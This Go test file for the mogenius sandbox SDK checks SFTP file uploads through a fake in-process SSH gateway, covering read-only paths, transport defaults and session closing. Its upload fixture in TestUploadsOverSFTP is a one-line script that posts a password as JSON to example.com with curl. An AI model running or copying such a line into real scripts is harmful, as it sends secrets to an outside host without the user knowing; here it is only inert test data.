package mogenius

import (
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"errors"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/coder/websocket"
	"github.com/pkg/sftp"
	"golang.org/x/crypto/ssh"

	sdkerrors "github.com/mogenius/mo-sandbox-sdk/packages/go/pkg/errors"
	"github.com/mogenius/mo-sandbox-sdk/packages/go/pkg/options"
	"github.com/mogenius/mo-sandbox-sdk/packages/go/pkg/types"
)

// sshGateway plays the stream gateway's port-forward in mode=ssh with the operator's SSH gateway behind it: every
// connection through the stream reaches an in-process SSH server (login "none") whose sftp subsystem writes into
// an in-memory file system. Writes below /ro/ are refused, as a read-only mount would.
type sshGateway struct {
	t      *testing.T
	files  sftp.Handlers
	config *ssh.ServerConfig

	mu     sync.Mutex
	users  []string
	closed int
}

func newSSHGateway(t *testing.T) *sshGateway {
	t.Helper()
	_, key, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	signer, err := ssh.NewSignerFromKey(key)
	if err != nil {
		t.Fatal(err)
	}
	g := &sshGateway{t: t, files: sftp.InMemHandler()}
	g.config = &ssh.ServerConfig{NoClientAuth: true}
	g.config.AddHostKey(signer)
	return g
}

// stream answers one gateway socket: PEER_IS_READY, then the port-forward frames.
func (g *sshGateway) stream(conn *websocket.Conn, r *http.Request) {
	ctx := r.Context()
	_ = conn.Write(ctx, websocket.MessageText, []byte("PEER_IS_READY"))
	var mu sync.Mutex
	subs := map[string]net.Conn{}
	defer func() {
		g.mu.Lock()
		g.closed++
		g.mu.Unlock()
		mu.Lock()
		defer mu.Unlock()
		for _, sub := range subs {
			_ = sub.Close()
		}
	}()
	for {
		typ, data, err := conn.Read(ctx)
		if err != nil {
			return
		}
		if typ == websocket.MessageBinary {
			head := 1 + int(data[0])
			mu.Lock()
			sub := subs[string(data[1:head])]
			mu.Unlock()
			if sub != nil {
				_, _ = sub.Write(data[head:])
			}
			continue
		}
		text := string(data)
		if !strings.HasPrefix(text, "PFM:O:") {
			continue
		}
		id := strings.TrimPrefix(text, "PFM:O:")
		local, remote := net.Pipe()
		mu.Lock()
		subs[id] = local
		mu.Unlock()
		go g.serveSSH(remote)
		go func() {
			buf := make([]byte, 32<<10)
			for {
				n, err := local.Read(buf)
				if n > 0 {
					frame := append(append([]byte{byte(len(id))}, id...), buf[:n]...)
					if conn.Write(context.Background(), websocket.MessageBinary, frame) != nil {
						return
					}
				}
				if err != nil {
					_ = conn.Write(context.Background(), websocket.MessageText, []byte("PFM:C:"+id))
					return
				}
			}
		}()
	}
}

func (g *sshGateway) serveSSH(conn net.Conn) {
	defer conn.Close()
	server, chans, reqs, err := ssh.NewServerConn(conn, g.config)
	if err != nil {
		return
	}
	g.mu.Lock()
	g.users = append(g.users, server.User())
	g.mu.Unlock()
	go ssh.DiscardRequests(reqs)
	for newChannel := range chans {
		if newChannel.ChannelType() != "session" {
			_ = newChannel.Reject(ssh.UnknownChannelType, "session only")
			continue
		}
		channel, requests, err := newChannel.Accept()
		if err != nil {
			return
		}
		go func() {
			for req := range requests {
				ok := req.Type == "subsystem" && string(req.Payload[4:]) == "sftp"
				_ = req.Reply(ok, nil)
				if ok {
					files := g.files
					files.FilePut = refuseReadOnly{files.FilePut}
					_ = sftp.NewRequestServer(channel, files).Serve()
					_ = channel.Close()
				}
			}
		}()
	}
}

type refuseReadOnly struct{ sftp.FileWriter }

func (r refuseReadOnly) Filewrite(req *sftp.Request) (io.WriterAt, error) {
	if strings.HasPrefix(req.Filepath, "/ro/") {
		return nil, os.ErrPermission
	}
	return r.FileWriter.Filewrite(req)
}

// read is a file of the in-memory file system.
func (g *sshGateway) read(t *testing.T, path string) string {
	t.Helper()
	req := sftp.NewRequest("Get", path)
	req.Flags = 1 // SSH_FXF_READ
	reader, err := g.files.FileGet.Fileread(req)
	if err != nil {
		t.Fatalf("%s: %v", path, err)
	}
	data, err := io.ReadAll(io.NewSectionReader(reader, 0, 1<<20))
	if err != nil {
		t.Fatal(err)
	}
	return string(data)
}

func (g *sshGateway) seen() (users []string, closed int) {
	g.mu.Lock()
	defer g.mu.Unlock()
	return append([]string(nil), g.users...), g.closed
}

func TestUploadsOverSFTP(t *testing.T) {
	f := newFakePlatform(t, reply{body: execJSON(0, "/home/sandbox\n", "")})
	gateway := newSSHGateway(t)
	f.gateway = gateway.stream
	fs := f.sandbox(t, nil).FileSystem
	ctx := context.Background()
	sftpOnly := options.WithTransport(options.TransportSFTP)
	local := filepath.Join(t.TempDir(), "local.sh")
	script := "jq -n --arg p \"$p\" '{password:$p}' | curl -s -X POST https://example.com -d @-\n"
	if err := os.WriteFile(local, []byte(script), 0o600); err != nil {
		t.Fatal(err)
	}

	if err := fs.UploadFile(ctx, []byte("hello"), "/w/data/a.txt", sftpOnly); err != nil {
		t.Fatal(err)
	}
	if err := fs.UploadFile(ctx, local, "/w/data/run.sh", sftpOnly); err != nil {
		t.Fatal(err)
	}
	if err := fs.UploadFile(ctx, []byte("relative"), "notes/r.txt", sftpOnly); err != nil {
		t.Fatal(err)
	}
	var sent int64
	source := io.MultiReader(strings.NewReader("chunk-1 "), strings.NewReader("chunk-2"))
	if err := fs.UploadFileStream(ctx, source, "/w/s.txt", WithUploadTransport(options.TransportSFTP),
		WithUploadProgress(func(p UploadProgress) { sent = p.BytesSent })); err != nil {
		t.Fatal(err)
	}
	results, err := fs.UploadFiles(ctx, []types.FileUpload{
		{Source: []byte("one"), Destination: "/w/many/1.txt"},
		{Source: []byte("denied"), Destination: "/ro/2.txt"},
		{Source: []byte("three"), Destination: "/w/many/3.txt"},
	}, sftpOnly)
	if err != nil {
		t.Fatal(err)
	}

	for path, want := range map[string]string{
		"/w/data/a.txt": "hello", "/w/data/run.sh": script, "/home/sandbox/notes/r.txt": "relative",
		"/w/s.txt": "chunk-1 chunk-2", "/w/many/1.txt": "one", "/w/many/3.txt": "three",
	} {
		if got := gateway.read(t, path); got != want {
			t.Errorf("%s = %q, want %q", path, got, want)
		}
	}
	if sent != 15 {
		t.Errorf("progress %d", sent)
	}
	if !results[0].Success || results[1].Success || !results[2].Success || results[1].Path != "/ro/2.txt" ||
		!strings.Contains(results[1].Error, "/ro/2.txt") {
		t.Fatalf("results %+v", results)
	}

	// one stream and one SSH login for every upload; the only HTTP call is the working directory
	queries := f.streamQueries()
	if len(queries) != 1 {
		t.Fatalf("%d streams", len(queries))
	}
	for key, value := range map[string]string{
		"authorization": "bearer mo_pat:user:secret", "organizationId": "org-1", "clusterId": "cluster-1",
		"type": "PORT_FORWARD", "cmd": "port-forward", "namespace": "agent-sandbox", "kind": "Pod",
		"workloadName": "default-k27tp", "mode": "ssh",
	} {
		if queries[0].Get(key) != value {
			t.Errorf("query %s = %q, want %q", key, queries[0].Get(key), value)
		}
	}
	if queries[0].Has("remotePort") || queries[0].Has("binary") {
		t.Fatalf("query %v", queries[0])
	}
	if users, _ := gateway.seen(); len(users) != 1 || users[0] != "sandbox" {
		t.Fatalf("ssh users %v", users)
	}
	calls := f.recorded()
	if len(calls) != 1 || !strings.HasPrefix(calls[0].path, "/resource/exec/") {
		t.Fatalf("http calls %+v", calls)
	}
}

func TestUploadFileRefusedByTheSandboxIsAFileError(t *testing.T) {
	f := newFakePlatform(t)
	gateway := newSSHGateway(t)
	f.gateway = gateway.stream
	fs := f.sandbox(t, nil).FileSystem
	ctx := context.Background()

	err := fs.UploadFile(ctx, []byte("x"), "/ro/x.txt", options.WithTransport(options.TransportSFTP))
	var base *sdkerrors.MogeniusError
	if !errors.As(err, &base) || base.Source != sdkerrors.SourceOperator || base.ErrorCode != "" ||
		!strings.Contains(base.Message, "Upload to /ro/x.txt failed") {
		t.Fatalf("got %v", err)
	}
	// the session stays for the next upload
	if err := fs.UploadFile(ctx, []byte("y"), "/w/y.txt", options.WithTransport(options.TransportSFTP)); err != nil {
		t.Fatal(err)
	}
	if len(f.streamQueries()) != 1 {
		t.Fatalf("%d streams", len(f.streamQueries()))
	}
}

func TestFileTransportDefaultsToTheClients(t *testing.T) {
	f := newFakePlatform(t, reply{status: 201, body: []any{map[string]any{"path": "/w/h.txt", "success": true}}})
	gateway := newSSHGateway(t)
	f.gateway = gateway.stream
	config := f.config()
	config.FileTransport = "sftp"
	client, err := NewClientWithConfig(config)
	if err != nil {
		t.Fatal(err)
	}
	fs := newSandbox(client.api, decodeSandbox(t, sandboxJSON(nil)), types.CodeLanguagePython).FileSystem
	ctx := context.Background()

	if err := fs.UploadFile(ctx, []byte("over sftp"), "/w/s.txt"); err != nil {
		t.Fatal(err)
	}
	if err := fs.UploadFile(ctx, []byte("over http"), "/w/h.txt", options.WithTransport(options.TransportHTTP)); err != nil {
		t.Fatal(err)
	}
	if got := gateway.read(t, "/w/s.txt"); got != "over sftp" {
		t.Fatalf("sftp file %q", got)
	}
	if calls := f.recorded(); len(calls) != 1 || !strings.HasSuffix(calls[0].path, "/upload") {
		t.Fatalf("http calls %+v", calls)
	}

	t.Setenv("MOGENIUS_FILE_TRANSPORT", "SFTP")
	config.FileTransport = ""
	if client, err := NewClientWithConfig(config); err != nil || client.api.cfg.fileTransport != options.TransportSFTP {
		t.Fatalf("env: %v", err)
	}
	t.Setenv("MOGENIUS_FILE_TRANSPORT", "ftp")
	var validation *sdkerrors.MogeniusValidationError
	if _, err := NewClientWithConfig(config); !errors.As(err, &validation) {
		t.Fatalf("ftp: got %v", err)
	}
}

func TestSFTPUnavailableIsExplicit(t *testing.T) {
	cases := map[string]struct {
		gateway func(*websocket.Conn, *http.Request)
		kind    func(error) bool
	}{
		"gateway switched off": {func(conn *websocket.Conn, r *http.Request) {
			_ = conn.Write(r.Context(), websocket.MessageText, []byte("ERROR: the SSH gateway is disabled"))
			_, _, _ = conn.Read(r.Context())
		}, func(err error) bool { return strings.Contains(err.Error(), "SSH gateway is disabled") }},
		"key refused": {func(conn *websocket.Conn, r *http.Request) {
			_ = conn.Write(r.Context(), websocket.MessageText, []byte("UNAUTHORIZED"))
			_, _, _ = conn.Read(r.Context())
		}, func(err error) bool {
			var forbidden *sdkerrors.MogeniusForbiddenError
			return errors.As(err, &forbidden)
		}},
		"no ssh behind the stream": {func(conn *websocket.Conn, r *http.Request) {
			_ = conn.Write(r.Context(), websocket.MessageText, []byte("PEER_IS_READY"))
			for {
				typ, data, err := conn.Read(r.Context())
				if err != nil {
					return
				}
				if typ == websocket.MessageText && strings.HasPrefix(string(data), "PFM:O:") {
					_ = conn.Write(r.Context(), websocket.MessageText, []byte("PFM:C:"+strings.TrimPrefix(string(data), "PFM:O:")))
				}
			}
		}, func(err error) bool { return strings.Contains(err.Error(), "SSH gateway refused the connection") }},
	}
	for name, c := range cases {
		f := newFakePlatform(t)
		f.gateway = c.gateway
		err := f.sandbox(t, nil).FileSystem.UploadFile(context.Background(), []byte("x"), "/w/x",
			options.WithTransport(options.TransportSFTP))
		var base *sdkerrors.MogeniusError
		if !errors.As(err, &base) || base.ErrorCode != ErrorCodeSFTPUnavailable || !c.kind(err) {
			t.Errorf("%s: got %v", name, err)
		}
		if len(f.recorded()) != 0 {
			t.Errorf("%s: fell back to HTTP", name)
		}
	}
}

func TestSFTPSessionClosesWhenIdleAndOnDelete(t *testing.T) {
	previous := sftpIdle
	sftpIdle = 20 * time.Millisecond
	t.Cleanup(func() { sftpIdle = previous })

	f := newFakePlatform(t, reply{body: sandboxJSON(map[string]any{"state": "deleting"})})
	gateway := newSSHGateway(t)
	f.gateway = gateway.stream
	sandbox := f.sandbox(t, nil)
	ctx := context.Background()
	upload := func() {
		t.Helper()
		if err := sandbox.FileSystem.UploadFile(ctx, []byte("x"), "/w/x", options.WithTransport(options.TransportSFTP)); err != nil {
			t.Fatal(err)
		}
	}
	closedAfter := func(want int) {
		t.Helper()
		deadline := time.Now().Add(5 * time.Second)
		for {
			if _, closed := gateway.seen(); closed == want {
				return
			}
			if time.Now().After(deadline) {
				_, closed := gateway.seen()
				t.Fatalf("%d streams closed, want %d", closed, want)
			}
			time.Sleep(5 * time.Millisecond)
		}
	}

	upload()
	closedAfter(1)
	upload()
	closedAfter(2)
	if len(f.streamQueries()) != 2 {
		t.Fatalf("%d streams", len(f.streamQueries()))
	}

	// release reads sftpIdle in this goroutine; no timer is running now
	sftpIdle = time.Hour
	upload()
	if err := sandbox.Delete(ctx); err != nil {
		t.Fatal(err)
	}
	closedAfter(3)
}
